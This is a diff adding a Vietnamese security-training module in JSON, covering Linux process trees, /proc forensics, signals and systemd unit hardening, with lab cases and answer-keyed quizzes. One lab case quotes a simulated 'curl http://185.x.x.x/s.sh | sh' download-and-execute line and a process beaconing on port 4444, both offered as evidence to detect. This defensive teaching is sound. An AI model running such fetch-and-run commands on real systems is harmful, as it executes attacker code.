@@ -1,0 +1,1073 @@
+{
+  "id": "os02-m02-processes-services-shell",
+  "slug": "processes-services-shell",
+  "trackId": "os02-linux-foundations",
+  "title": "Processes, Services, Packages, Logs & Shell",
+  "summary": "Mô hình process và tín hiệu qua /proc; systemd unit và các directive hardening; toàn vẹn package, cron và môi trường shell — kèm quy trình đọc process tree phục vụ điều tra và review service theo checklist.",
+  "difficulty": "beginner",
+  "estimatedMinutes": 240,
+  "careerPaths": ["penetration-test", "red-team", "vulnerability-research"],
+  "domains": ["linux"],
+  "safetyLevel": "safe",
+  "lessons": [
+    {
+      "id": "os02-l16-processes-signals-and-procfs",
+      "slug": "processes-signals-and-procfs",
+      "title": "Process Tree, Signals & /proc",
+      "summary": "PID/PPID và cây tiến trình từ init; fork/exec kế thừa danh tính và môi trường; bộ signal chuẩn và khác biệt TERM/KILL; /proc như cửa sổ trạng thái runtime cho cả vận hành lẫn forensics.",
+      "difficulty": "beginner",
+      "durationMinutes": 80,
+      "prerequisites": [],
+      "outcomes": [
+        "Đọc cây tiến trình (PID/PPID) để suy luận cha-con và nhận diện process lạ không có cha hợp lệ.",
+        "Giải thích fork/exec: process con kế thừa UID, open files và environment của cha — hệ quả bảo mật của env inheritance.",
+        "Phân biệt SIGTERM (mềm, process tự dọn) và SIGKILL (cứng, kernel hủy không hỏi) cùng vai trò trong incident response.",
+        "Sử dụng mô phỏng /proc/PID (cmdline, environ, fd, status) để truy vết nguồn gốc một process đáng ngờ."
+      ],
+      "careerPaths": ["penetration-test", "red-team", "vulnerability-research"],
+      "domains": ["linux"],
+      "attackTactics": ["TA0003"],
+      "keywords": ["pid-ppid", "fork-exec", "sigterm-sigkill", "procfs", "process-tree"],
+      "safetyLevel": "safe",
+      "mentalModel": "Mọi process trên Linux là nút trong MỘT cây duy nhất rooted tại init/systemd (PID 1). Sinh ra process = fork (nhân bản cha) rồi exec (thay thân xác bằng binary mới) — con KẾ THỪA mọi thứ của cha: UID, file descriptors mở, environment variables. Vì vậy process 'lạ' luôn có câu chuyện gia đình: ai sinh nó, nó mang danh tính ai. Signal là ngôn ngữ điều khiển: TERM là thư đuổi khéo ('tự sắp xếp đi'), KILL là bắn tại chỗ ('kernel giùm tôi'). /proc là tủ hồ sơ runtime: mỗi PID một thư mục chứa cmdline (nó chạy gì), environ (nó mang biến gì), fd (nó cầm cửa nào) — đọc thành thạo tủ này là biết điều tra mà không cần tool nào.",
+      "visual": {
+        "title": "Cây Tiến trình và Tủ hồ sơ /proc",
+        "caption": "fork→exec kế thừa identity/env; signal điều khiển vòng đời; /proc/PID lộ cmdline-environ-fd.",
+        "steps": [
+          {
+            "label": "PID 1 — gốc",
+            "detail": "systemd/init nuôi mọi orphan; nếu attacker chiếm PID 1 (container!) thì chiếm toàn cây — lý do container cần init an toàn.",
+            "tone": "stop"
+          },
+          {
+            "label": "fork → exec",
+            "detail": "Con copy UID/GID/fd/env của cha trước khi đổi binary; malware hay spawn từ service bị chiếm giữ đúng env nhạy cảm của service đó.",
+            "tone": "caution"
+          },
+          {
+            "label": "Signals chuẩn",
+            "detail": "TERM cho cơ hội dọn (flush log, đóng fd); KILL -9 là last resort vì bỏ sót dọn dẹp → dữ liệu/log thiếu; HUP dùng để reload config.",
+            "tone": "neutral"
+          },
+          {
+            "label": "/proc/PID/cmdline + environ",
+            "detail": "cmdline cho thấy lệnh thật (đôi khi khác tên process); environ lộ DB_PASSWORD kiểu biến — forensics vàng nhưng cũng rò rỉ tiềm năng.",
+            "tone": "caution"
+          },
+          {
+            "label": "/proc/PID/fd",
+            "detail": "Symlink tới file đang mở: log bị xóa vẫn thấy ở đây; socket kết nối đi đâu cũng thấy.",
+            "tone": "allow"
+          }
+        ]
+      },
+      "sections": [
+        {
+          "title": "Cây Tiến trình: Ai Sinh Ra Ai",
+          "paragraphs": [
+            "Mỗi process có PID (số duy nhất) và PPID (cha sinh ra nó). Khi cha chết trước con, con thành orphan và PID 1 nhận nuôi. Trong điều tra, PPID là manh mối số một: webshell thường được sinh bởi process web server; reverse shell xuất hiện với cha là apache/nginx nghĩa là app-level compromise, cha là sshd nghĩa là credential compromise — hai hướng xử lý hoàn toàn khác.",
+            "Ngoài ra còn trạng thái: R running, S sleeping, D uninterruptible sleep (thường chờ IO — kill -9 cũng không ăn), Z zombie (đã chết, chờ cha reap). Zombie nhiều bất thường là dấu hiệu process cha lỗi; process ẩn (rootkit hidepid hoặc LD_PRELOAD hook) là tầng sâu hơn — ps so với /proc liệt kê trực tiếp giúp phát hiện lệch."
+          ],
+          "points": [
+            "ps auxf / pstree in cây; ps -eo pid,ppid,user,lstart,cmd đầy đủ timestamp để build timeline.",
+            "PID recycle: PID cũ tái sử dụng — timeline phải ghép PPID + thời điểm, không chỉ số PID.",
+            "Container: process trong container nhìn từ host vẫn là process thường — namespace chỉ che tầm nhìn bên trong."
+          ]
+        },
+        {
+          "title": "fork/exec và Di sản của Cha",
+          "paragraphs": [
+            "fork() nhân bản process gọi (hai bản chạy tiếp từ cùng điểm); exec() thay thế ảnh nhớ bằng binary mới nhưng GIỮ: PID, open fds (trừ close-on-exec), environment, umask, cwd. Environment là mảng KEY=VALUE kế thừa suốt chuỗi: PATH sai thứ tự trong env của service = PATH hijacking cho mọi con nó sinh; biến chứa credential trong env của service = credential nằm sẵn trong /proc/PID/environ của mọi con.",
+            "Vì vậy review service luôn gồm hai câu: (1) env nào nó mang — có secret không?; (2) PATH/cwd của nó là gì — binary gọi theo tên tương đối sẽ resolve thế nào? Đây chính là nền của hai finding kinh điển: relative-path hijack và secret-in-env."
+          ],
+          "points": [
+            "tr '\\0' '\\n' </proc/PID/environ đọc env dạng đọc được; cần quyền owner/root.",
+            "execve vs system()/popen: hai cái sau đi qua shell — injection surface lớn hơn hẳn.",
+            "Setuid binary nên scrub env nhạy cảm (LD_PRELOAD bị loader bỏ với setuid, nhưng PATH/IFS vẫn cẩn trọng)."
+          ]
+        },
+        {
+          "title": "Signals: Ngôn ngữ Điều khiển Vòng đời",
+          "paragraphs": [
+            "SIGTERM (15): yêu cầu lịch sự — process bắt được, dọn dẹp (ghi log cuối, flush buffer, đóng connection) rồi thoát. SIGKILL (9): kernel hủy ngay, process KHÔNG THỂ bắt — dữ liệu chưa flush mất, log thiếu đoạn cuối. Trong IR: ưu tiên TERM trước để giữ evidence trong memory được process ghi ra; KILL khi nghi process đang phá evidence chủ động. SIGHUP truyền thống reload config cho daemon.",
+            "Chi tiết hay quên: signal gửi theo UID — user thường không signal process người khác (trừ cùng session vài trường hợp); root signal được tất cả. Trap trong script có thể nuốt TERM (chống kill lịch sự) — process 'bất tử' với TERM nhưng không chống nổi KILL. Và D-state process: ngay cả KILL cũng phải chờ IO trả về — hiểu trạng thái tránh 'kill mãi không chết' tưởng rootkit."
+          ],
+          "points": [
+            "kill -TERM PID mặc định của lệnh kill; killall/pkill theo tên — cẩn thận match rộng.",
+            "Trap TERM trong unit file (ExecStop=/KillSignal=) định nghĩa hành vi dọn của systemd service.",
+            "Zombie không thể kill — đã chết; phải fix cha (reap) chứ không phải con."
+          ]
+        },
+        {
+          "title": "/proc: Tủ hồ sơ Runtime",
+          "paragraphs": [
+            "/proc/PID/ gồm: cmdline (argv, NUL-separated), environ (env lúc exec), cwd (symlink tới working dir), exe (symlink tới binary thật — phát hiện process giả tên), fd/* (mọi file/socket đang mở), status (UID, PPID, threads, memory). Deleted-but-open file vẫn liệt kê trong fd với hậu tố '(deleted)' — kỹ thuật phục hồi log đã unlink (liên hệ os02-l13 inode model).",
+            "Quy trình truy vết một process đáng ngờ (mô phỏng): (1) status → PPID + UID thật; (2) exe → binary thật đứng sau tên; (3) cmdline + environ → chạy với tham số/secret gì; (4) fd → cầm những file/socket nào; (5) so timeline lstart với event khác. Năm bước này dựng nên hồ sơ đầy đủ không cần EDR."
+          ],
+          "points": [
+            "ls -l /proc/PID/exe với '(deleted)' = binary đã bị thay/xóa khi còn chạy — indicator mạnh.",
+            "hidepid mount option hạn chế user thường xem /proc của nhau — giảm recon nội bộ.",
+            "Audit: auditd watch execve + Sysmon-for-Linux/eBPF sensors là phiên bản tự động hóa của việc đọc /proc."
+          ]
+        }
+      ],
+      "lab": {
+        "title": "Process Desk — Truy vết Cây Tiến trình",
+        "objective": "Đọc output ps//proc mô phỏng để suy luận cha-con, nhận diện process giả danh và chọn đúng signal trong kịch bản response.",
+        "scenario": "Bạn điều tra một server Linux mô phỏng có báo cáo hành vi lạ: output `ps auxf` rút gọn, vài thư mục /proc/PID (cmdline, environ, fd excerpts), và log auth. Toàn bộ tĩnh trong trình duyệt.",
+        "constraints": [
+          "Chỉ suy luận từ dữ liệu cấp; không kill/gửi signal thật.",
+          "Mỗi kết luận về cha-con phải trích PID/PPID cụ thể.",
+          "Lựa chọn signal phải nêu trade-off evidence."
+        ],
+        "cases": [
+          {
+            "id": "proc-case-01",
+            "title": "ps auxf khả nghi",
+            "context": "root 1 … /sbin/init | www-data 812 … nginx: worker | www-data 900 … sh -c curl http://185.x.x.x/s.sh | sh | www-data 901 … /bin/bash (con của 900) | root 1300 … /usr/sbin/sshd | nam 1400 … sshd: nam@pts/0 | nam 1450 … python3 /home/nam/tools/scan.py",
+            "prompt": "Nhận định chuỗi sự kiện và mức độ?",
+            "options": [
+              {
+                "id": "A",
+                "label": "P1: scan.py của nam là tấn công mạng — isolate ngay.",
+                "correct": false,
+                "rationale": "nam là user hợp lệ chạy tool từ home dir qua SSH session riêng — có thể là hoạt động được phép; cần đối chiếu ROE/trước khi xếp P1."
+              },
+              {
+                "id": "B",
+                "label": "Compromise app-level chắc chắn: 900 (sh -c curl…|sh) sinh bởi nginx worker 812 → webshell/RCE trong app; 901 bash là payload stage. Xử lý: snapshot proc evidence TRƯỚC (environ/fd của 900-901, cmdline đầy đủ), rồi TERM nginx worker để giữ log, isolate network. Cha là sshd (1400→1450) của nam là luồng khác — verify với ROE.",
+                "correct": true,
+                "rationale": "Đọc đúng PPID chain: nginx→sh→bash là chữ ký RCE-download-execute; phân biệt với SSH session hợp lệ; thứ tự response bảo toàn evidence trước khi diệt."
+              },
+              {
+                "id": "C",
+                "label": "900 chỉ là cron job bình thường vì dùng sh.",
+                "correct": false,
+                "rationale": "PPID của 900 là nginx worker (812) chứ không phải cron (thường PPID=1 hoặc cron daemon) — curl-pipe-sh từ web worker là exploit stage."
+              },
+              {
+                "id": "D",
+                "label": "Chỉ cần kill -9 cả 2 process 900, 901 là xong.",
+                "correct": false,
+                "rationale": "Diệt không thu evidence (environ có thể chứa C2 info) và không vá gốc (webshell/RCE trong app vẫn còn) — chúng sẽ quay lại."
+              }
+            ]
+          },
+          {
+            "id": "proc-case-02",
+            "title": "/proc excerpt: process giả tên",
+            "context": "ps hiển thị '[kworker/u8:2]'. /proc/2049/cmdline: rỗng-style '[kworker/u8:2]' | /proc/2049/exe -> /tmp/.x/kworker (deleted) | /proc/2049/status: PPid: 1337, Uid: 0 | /proc/2049/fd/4 -> socket:[555001] kết nối outbound :4444",
+            "prompt": "Diễn giải đúng nhất?",
+            "options": [
+              {
+                "id": "A",
+                "label": "kworker là kernel thread bình thường — bỏ qua.",
+                "correct": false,
+                "rationale": "Kernel thread thật có exe trỏ nowhere và PPid=2 (kthreadd); đây là userland process giả danh với exe ở /tmp đã deleted."
+              },
+              {
+                "id": "B",
+                "label": "Rootkit-style masquerading: userland process giả tên kernel worker, binary ở /tmp/.x đã unlinked khi chạy (che khỏi ls), cha 1337 (dropper), socket outbound :4444 (C2/reverse). Evidence: exe(deleted) + PPid lệch + fd socket. Response: capture /proc/2049 trước khi kill, trace 1337, block C2.",
+                "correct": true,
+                "rationale": "Tổng hợp đúng ba indicator (giả danh + exe-deleted + cha lạ + beacon port) và biết thứ tự capture-trước-diệt-sau."
+              },
+              {
+                "id": "C",
+                "label": "exe -> (deleted) nghĩa là binary lỗi — reinstall package là hết.",
+                "correct": false,
+                "rationale": "(deleted) khi đang chạy là kỹ thuật che giấu chủ đích, không phải hư hỏng gói phần mềm."
+              },
+              {
+                "id": "D",
+                "label": "Outbound :4444 vô hại vì firewall đã allow.",
+                "correct": false,
+                "rationale": ":4444 là port Metasploit-default kinh điển; firewall allow chỉ chứng minh kênh ĐANG thông, càng nguy hơn."
+              }
+            ]
+          },
+          {
+            "id": "proc-case-03",
+            "title": "Chọn signal cho IR",
+            "context": "Tình huống A: service ghi log liên tục vào file evidence chung, nghi bị lợi dụng để ghi đè log; cần dừng NHANH mà vẫn muốn buffer cuối được flush. Tình huống B: process nghi đang chủ động xóa log mỗi 30s; cần dừng tức thì. Tình huống C: daemon cần reload config sau đổi ACL không downtime.",
+            "prompt": "Chọn signal đúng từng tình huống?",
+            "options": [
+              {
+                "id": "A",
+                "label": "A: KILL -9; B: TERM; C: KILL -9.",
+                "correct": false,
+                "rationale": "Ngược hoàn toàn: A cần TERM để flush; B cần KILL vì process phá evidence không nên cho cơ hội trap; C cần HUP/reload."
+              },
+              {
+                "id": "B",
+                "label": "A: SIGTERM (cho flush log cuối vào evidence); B: SIGKILL (chặn ngay, không cho trap dọn-phá thêm); C: SIGHUP hoặc systemctl reload (không downtime). Quy tắc: TERM khi muốn process tự kể chuyện cuối, KILL khi nghi nó đang hủy chứng cứ, HUP cho config.",
+                "correct": true,
+                "rationale": "Áp đúng semantics từng signal theo mục tiêu evidence — TERM giữ lời khai, KILL cắt tay, HUP đổi config; đây là quyết định IR thực chiến."
+              },
+              {
+                "id": "C",
+                "label": "Luôn KILL -9 cho nhanh trong mọi tình huống IR.",
+                "correct": false,
+                "rationale": "-9 bỏ qua cleanup: mất log buffer cuối (A), đôi khi trigger watchdog restart service (tái nhiễm), và không chuyên nghiệp trong reporting."
+              },
+              {
+                "id": "D",
+                "label": "Signal nào cũng vậy — miễn process chết.",
+                "correct": false,
+                "rationale": "Semantics signal khác nhau ảnh hưởng trực tiếp chất lượng evidence và tính ổn định dịch vụ — khác biệt cốt lõi của lesson này."
+              }
+            ]
+          }
+        ],
+        "successCriteria": [
+          "Truy vết đúng chuỗi cha-con từ ps output và suy luận vector xâm nhập.",
+          "Nhận diện masquerading qua /proc/exe + PPid + fd evidence.",
+          "Chọn signal phù hợp mục tiêu evidence trong ba tình huống response."
+        ],
+        "evidenceTemplate": [
+          "Process tree annotated: PID→PPID chain với verdict từng node",
+          "Bảng /proc evidence: field, giá trị, ý nghĩa điều tra",
+          "Signal decision matrix: tình huống → signal → trade-off",
+          "Response order: capture → contain → eradicate"
+        ],
+        "reset": "Đặt lại lựa chọn để điều tra lại process tree từ đầu.",
+        "cleanup": "Bài tập mô phỏng logic an toàn trong trình duyệt, không thao tác process thật."
+      },
+      "governance": {
+        "prevent": [
+          "Service env: cấm secret-in-env plaintext; dùng secret manager/file 0600 mount.",
+          "PATH của service cố định tuyệt đối trong ExecStart; binary gọi full path.",
+          "Baseline process whitelist per-host (allowlist daemon set) — node lạ ngoài baseline là alarm."
+        ],
+        "observe": [
+          "Alert process cha-là-webserver sinh shell (auditd execve rules); monitor /proc/*/exe (deleted).",
+          "Log signal delivery bất thường (pkill mass-execution) — anti-forensics indicator."
+        ],
+        "respond": [
+          "Capture trước diệt sau: dump /proc/{cmdline,environ,fd,status} + mem khi ROE cho phép, rồi TERM/KILL theo case.",
+          "Trace cha (PPid) lên tận PID 1 để map toàn chuỗi compromise; container thì freeze container thay vì kill trong."
+        ],
+        "residualRisk": [
+          "Kernel-level rootkit có thể hook /proc view — sensor eBPF/từ ngoài host tăng độ tin cậy.",
+          "PID recycle làm timeline dễ nhầm — luôn ghép timestamp, không dựa PID đơn thuần."
+        ]
+      },
+      "misconceptions": [
+        {
+          "claim": "kill -9 là cách kill 'đúng chuẩn' mọi tình huống.",
+          "correction": "KILL bỏ qua cleanup: mất flush log/buffer, có thể trigger watchdog. Chuẩn IR: TERM trước (giữ evidence), KILL khi nghi process đang hủy chứng cứ."
+        },
+        {
+          "claim": "Tên process trong ps là định danh tin cậy.",
+          "correction": "Tên là argv[0] do process tự khai — giả danh trivially; binary thật nằm ở /proc/PID/exe, PPID và fd mới là evidence khó giả."
+        },
+        {
+          "claim": "Environment variable chỉ là cấu hình vô hại.",
+          "correction": "Env kế thừa suốt chuỗi fork/exec và đọc được từ /proc/PID/environ — secret trong env của service nằm trong tầm tay mọi code nó chạy và mọi local user đủ quyền."
+        },
+        {
+          "claim": "Zombie process cần được kill gấp.",
+          "correction": "Zombie đã chết, không chiếm CPU/memory (chỉ entry bảng process) — vấn đề nằm ở CHA không reap; fix cha chứ kill-zombie là vô nghĩa."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "os02-l16-q1",
+          "difficulty": "easy",
+          "question": "Khác biệt cốt lõi giữa SIGTERM và SIGKILL?",
+          "options": [
+            { "id": "A", "label": "TERM dành cho user, KILL dành cho root" },
+            {
+              "id": "B",
+              "label": "TERM process có thể bắt để dọn dẹp trước khi thoát; KILL kernel hủy ngay, process không thể can thiệp"
+            },
+            { "id": "C", "label": "KILL chỉ hoạt động với process nền" },
+            { "id": "D", "label": "TERM chậm hơn KILL về mặt kỹ thuật" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "TERM (15) là request có thể trap; KILL (9) do kernel thực thi trực tiếp — không handler nào chạy được."
+        },
+        {
+          "id": "os02-l16-q2",
+          "difficulty": "medium",
+          "question": "Một process có PPID là nginx worker. Ý nghĩa điều tra mạnh nhất?",
+          "options": [
+            { "id": "A", "label": "Process được khởi động bởi cron" },
+            {
+              "id": "B",
+              "label": "Nghi vấn RCE/webshell trong ứng dụng web — web server trực tiếp sinh process con là hành vi bất thường của worker"
+            },
+            { "id": "C", "label": "Process là plugin chính thức của nginx" },
+            { "id": "D", "label": "Không có ý nghĩa — PPID ngẫu nhiên" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Worker web server bình thường không spawn shell/tool; quan hệ cha-con này là chữ ký kinh điển của app-level compromise."
+        },
+        {
+          "id": "os02-l16-q3",
+          "difficulty": "hard",
+          "question": "ls -l /proc/2049/exe trả về '/tmp/.x/worker (deleted)'. Vì sao đây là indicator mạnh hơn việc process có tên lạ?",
+          "options": [
+            { "id": "A", "label": "Vì /tmp luôn bị cấm chạy binary" },
+            {
+              "id": "B",
+              "label": "Vì binary đã bị unlink KHI process còn chạy — kỹ thuật che khỏi ls/file-scanner chủ động, đồng thời exe symlink vẫn chỉ ra đường dẫn gốc: chứng minh chủ đích che giấu chứ không phải tai nạn đặt tên"
+            },
+            { "id": "C", "label": "Vì file deleted không thể chạy được" },
+            { "id": "D", "label": "Vì /proc không lưu symlink" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Unlink-khi-đang-chạy tận dụng inode model (lesson l13): dữ liệu sống đến khi fd cuối đóng — malware lợi dụng điều này vừa chạy vừa 'vô hình' với file listing; /proc/exe là nơi nó lộ chân tượng."
+        }
+      ],
+      "transferChallenge": {
+        "scenario": "Bạn thiết kế playbook IR cho fleet web server Linux mô phỏng: alert khi process con của nginx/apache sinh ra; cần phân loại nhanh false-positive (deploy script, health-check) so với thật (webshell, downloader) trong 5 phút đầu.",
+        "tasks": [
+          "Thiết kế decision tree 5 phút: PPID → cmdline pattern → exe path → fd/network → verdict (FP/investigate/incident).",
+          "Viết checklist evidence capture /proc per-PID với thứ tự ưu tiên khi host đang active-compromise.",
+          "Đề xuất auditd/eBPF rule set tối thiểu để alert chính xác 'web-parent → exec' với ít noise nhất."
+        ],
+        "requiredEvidence": [
+          "Decision tree có nhánh FP rõ ràng",
+          "Capture checklist theo thứ tự bay hơi-evidence",
+          "Rule set với rationale từng rule"
+        ]
+      },
+      "sources": [
+        {
+          "title": "Linux man-pages — proc(5): proc filesystem",
+          "url": "https://man7.org/linux/man-pages/man5/proc.5.html",
+          "publisher": "Linux Kernel Organization",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": ["Cấu trúc /proc/PID: cmdline, environ, exe, fd, status"]
+        },
+        {
+          "title": "Linux man-pages — signal(7): signal list and semantics",
+          "url": "https://man7.org/linux/man-pages/man7/signal.7.html",
+          "publisher": "Linux Kernel Organization",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": ["Semantics SIGTERM/SIGKILL/SIGHUP và khả năng trap"]
+        },
+        {
+          "title": "NIST SP 800-83 Rev.1 — Guide to Malware Incident Prevention (containment principles)",
+          "url": "https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final",
+          "publisher": "National Institute of Standards and Technology (NIST)",
+          "sourceType": "official-guidance",
+          "accessedAt": "2026-08-25",
+          "supports": ["Nguyên tắc evidence preservation trong containment decisions"]
+        }
+      ]
+    },
+    {
+      "id": "os02-l17-systemd-units-and-journal",
+      "slug": "systemd-units-and-journal",
+      "title": "systemd Units, Hardening Directives & Journal",
+      "summary": "Giải phẫu unit file và vòng lifecycle service; các directive sandbox (User, NoNewPrivileges, ProtectSystem, CapabilityBoundingSet); journalctl query methodology; review service theo checklist tìm writable-unit/binary misconfig.",
+      "difficulty": "beginner",
+      "durationMinutes": 80,
+      "prerequisites": ["os02-l16-processes-signals-and-procfs"],
+      "outcomes": [
+        "Đọc cấu trúc unit file ([Unit]/[Service]/[Install]) và mô tả vòng đời start/stop/restart/reload của systemd.",
+        "Giải thích tác động từng hardening directive: User/Group, NoNewPrivileges, ProtectSystem/ProtectHome, CapabilityBoundingSet.",
+        "Xây dựng truy vấn journalctl theo unit/time/priority để điều tra sự cố và sự cố bảo mật.",
+        "Chạy checklist review service: ExecStart absolute path, unit-file ownership, binary writability, privilege level phù hợp."
+      ],
+      "careerPaths": ["penetration-test", "red-team", "vulnerability-research"],
+      "domains": ["linux"],
+      "attackTactics": ["TA0003", "TA0004"],
+      "keywords": [
+        "systemd",
+        "unit-file",
+        "nonewprivileges",
+        "journalctl",
+        "service-hardening"
+      ],
+      "safetyLevel": "safe",
+      "mentalModel": "systemd là người quản gia PID 1: đọc 'hợp đồng lao động' (unit file) của từng service — chạy gì, bằng ai, khi nào restart, giới hạn quyền ra sao — rồi giám sát suốt vòng đời. Unit file là nơi QUYỀN LỰC của service được định nghĩa: User= nói nó mặc áo ai, NoNewPrivileges= chặn con nó leo thang, ProtectSystem= khóa filesystem readonly, CapabilityBoundingSet= cắt đặc quyền hạt nhân. Journal là cuốn nhật ký có index: query theo unit/thời gian/mức độ như database thay vì grep file text. Review service trên Linux hiện đại = review unit file: 20 dòng chữ cho biết toàn bộ blast radius khi service bị chiếm.",
+      "visual": {
+        "title": "Unit File: Hợp đồng Quyền của Service",
+        "caption": "[Service] định nghĩa identity + sandbox; vi phạm hợp đồng = privesc; journal là nhật ký giám sát.",
+        "steps": [
+          {
+            "label": "ExecStart absolute",
+            "detail": "/usr/bin/app tốt hơn app: đường dẫn tương đối resolve theo PATH của service — hijack point kinh điển.",
+            "tone": "caution"
+          },
+          {
+            "label": "User= + Group=",
+            "detail": "Service chạy dedicated account (os02-l14); Root/User=root trong unit = mọi bug app là bug root.",
+            "tone": "stop"
+          },
+          {
+            "label": "NoNewPrivileges=yes",
+            "detail": "Con của service không thể setuid/setcap lên — chặn nguyên lớp SUID-based escalation.",
+            "tone": "allow"
+          },
+          {
+            "label": "ProtectSystem=strict",
+            "detail": "/usr,/boot,/etc readonly; ReadWritePaths= whitelist riêng — ransomware/defacement khó ghi hệ thống.",
+            "tone": "allow"
+          },
+          {
+            "label": "journalctl -u <svc>",
+            "detail": "Timeline start/stop/crash + stdout/stderr; -p err lọc lỗi; --since/--until ghép window incident.",
+            "tone": "neutral"
+          }
+        ]
+      },
+      "sections": [
+        {
+          "title": "Giải phẫu Unit File",
+          "paragraphs": [
+            "Ba section chính: [Unit] — metadata + dependency (After=, Requires=, Wants=); [Service] — hành vi runtime (Type=simple/forking/oneshot, ExecStart/Stop/Reload, Restart=on-failure, User=, WorkingDirectory=, Environment=); [Install] — target enable (WantedBy=multi-user.target). Unit files sống ở /usr/lib/systemd/system (distro) và /etc/systemd/system (admin override — precedence cao hơn).",
+            "Vòng đời: enable = đăng ký vào boot; start = systemd fork/exec theo ExecStart với TOÀN BỘ context directive; restart = stop+start (KillMode quyết định tín hiệu và scope); reload = gửi SIGHUP/signal riêng không restart process. Hiểu lifecycle giúp đọc log đúng: 'restart loop' (Restart=always + crash liên tục) là noise phổ biến che dấu hiệu thật."
+          ],
+          "points": [
+            "systemctl cat <svc> hiển thị unit GỐC + mọi drop-in override — luôn xem bản merged.",
+            "Drop-in directory (/etc/systemd/system/<svc>.service.d/*.conf) là cách patch sạch không đụng unit gốc.",
+            "daemon-reload bắt buộc sau khi sửa unit — quên là 'config không ăn' mystery số một."
+          ]
+        },
+        {
+          "title": "Hardening Directives: Siết Blast Radius",
+          "paragraphs": [
+            "Identity: User=/Group= (chạy non-root), SupplementaryGroups= khi cần. Privilege ceiling: NoNewPrivileges=yes (con không setuid-up), CapabilityBoundingSet= (chỉ giữ cap cần thiết — ví dụ CAP_NET_BIND_SERVICE cho port thấp, bỏ phần còn lại), AmbientCapabilities= cấp lại chi tiết. Filesystem: ProtectSystem=strict (toàn FS readonly trừ whitelist), ReadWritePaths=, ProtectHome=yes, PrivateTmp=yes (tmp riêng — chặn symlink-race cross-service từ lesson l13!), PrivateDevices=yes.",
+            "Network/user isolation: RestrictAddressFamilies=AF_INET AF_INET6 (chặn AF_UNIX abuse), DynamicUser=yes (auto ephemeral account), SystemCallFilter=@system-service (seccomp profile). Một unit hardened tốt khiến service bị RCE vẫn kẹt trong hộp: không ghi hệ thống, không setuid, không cap thừa. Đây là 'defense in depth at the unit boundary' — rẻ nhất trong mọi control Linux."
+          ],
+          "points": [
+            "systemd-analyze security <svc> chấm điểm exposure 0–10 với gợi ý directive — công cụ review tự động chính thống.",
+            "PrivateTmp=yes giải thích 'không thấy file tmp của service' — đừng sửa vì tưởng bug.",
+            "Directive sai có thể vỡ app — test staging + fallback rollback (drop-in removal) trước rollout."
+          ]
+        },
+        {
+          "title": "Misconfiguration: Các Finding Kinh điển",
+          "paragraphs": [
+            "(1) ExecStart path tương đối hoặc binary trong folder writable-by-service-user → replace-binary-then-restart = privesc (chuỗi từ l16: identity của unit quyết định impact). (2) Unit file trong /etc/systemd/system writable bởi group dev/test → persistence: ai sửa unit được là chạy lệnh gì cũng được lúc boot. (3) User=root cho service không cần → RCE-to-root trực tiếp. (4) Environment= chứa password plaintext → secret leak qua systemctl show/journal.",
+            "Review checklist 60 giây một unit: systemctl cat (merged config) → ExecStart absolute? binary+folder writable bởi ai? User=? → NoNewPrivileges/ProtectSystem có? → Environment có secret không? → systemd-analyze security score. Năm bước phủ ~90% finding service-level thực tế."
+          ],
+          "points": [
+            "Restart=always với service compromised = auto-relapse malware — IR cần disable unit, không chỉ kill.",
+            "WantedBy=multi-user.target nghĩa chạy ở mọi boot multi-user — inventory persistence cần list enabled units.",
+            "Timer units (.timer) thay cron systemd-native — audit song song cron (lesson sau)."
+          ]
+        },
+        {
+          "title": "Journal: Nhật ký Có Index",
+          "paragraphs": [
+            "journald gom stdout/stderr/syslog của mọi unit vào journal nhị phân có index: journalctl -u nginx.service (theo unit), -p err..alert (priority), --since/-until (window), -f (follow), _PID=<n> (field filter), -o json-pretty (machine-readable). Persistent mode (/var/log/journal) giữ log qua reboot — volatile mode mất hết khi reboot, kiểm trước khi dựa vào forensics.",
+            "IR workflow: xác định window incident → journalctl --since ... --until ... -u relevant.service → ghép timeline với auth.log (SSH/sudo) và auditd. Journal có Forward Secure Sealing (FSS) chống tam giác-local; nhưng best practice vẫn ship log ra collector ngoài — attacker root có thể tắt journald (control detection ở lesson telemetry track sau)."
+          ],
+          "points": [
+            "journalctl --disk-usage / --vacuum-size quản lý dung lượng — log đầy là log cũ xoay âm thầm.",
+            "StandardOutput=journal+console trong unit điều hướng stream — debug service không log là check đầu tiên.",
+            "Correlation id: ghép journal unit-time với nginx access log request-id để trace request gây RCE."
+          ]
+        }
+      ],
+      "lab": {
+        "title": "Unit Desk — Review Service theo Checklist",
+        "objective": "Đọc unit file merged để đánh giá blast radius, nhận diện misconfig privesc, và xây truy vấn journalctl cho window incident.",
+        "scenario": "Bạn review ba service trên server mô phỏng: unit files (gồm drop-in overrides), permission listing của unit/binary paths, và journal excerpt quanh giờ xảy ra sự cố. Toàn bộ tĩnh trong trình duyệt.",
+        "constraints": [
+          "Chỉ đánh giá theo dữ liệu cấp; không systemctl thật.",
+          "Mỗi verdict phải trích directive/path cụ thể.",
+          "Journal query đề xuất phải trả về đúng window/unit/priority."
+        ],
+        "cases": [
+          {
+            "id": "sysd-case-01",
+            "title": "Hai unit cạnh nhau",
+            "context": "app-api.service: [Service] User=api01, ExecStart=/opt/api/bin/server, NoNewPrivileges=yes, ProtectSystem=strict, ReadWritePaths=/var/lib/api, CapabilityBoundingSet= | deploy-hook.service: User=root, ExecStart=bash /srv/deploy/run.sh, PermissionsListing: /srv/deploy/run.sh owned dev-team, mode 664 (dev-team writable); NoNewPrivileges absent.",
+            "prompt": "Đánh giá và xếp hạng?",
+            "options": [
+              {
+                "id": "A",
+                "label": "app-api thiếu Restart=always — availability risk cao nhất.",
+                "correct": false,
+                "rationale": "Restart policy là availability tuning; hai finding ở deploy-hook (root + writable-by-dev script + no NNP) là security impact trực tiếp."
+              },
+              {
+                "id": "B",
+                "label": "P1: deploy-hook = root chạy script writable-by-dev-team → mọi dev là root-on-next-run; không NNP nên con script còn setuid-up được. Fix: root-owned 0755 script, hoặc hạ User= + sudo scoped; thêm NoNewPrivileges. app-api là exemplar hardened unit (non-root + strict + empty capset). Verify: thử edit script bằng dev-account phải fail; systemd-analyze security re-score.",
+                "correct": true,
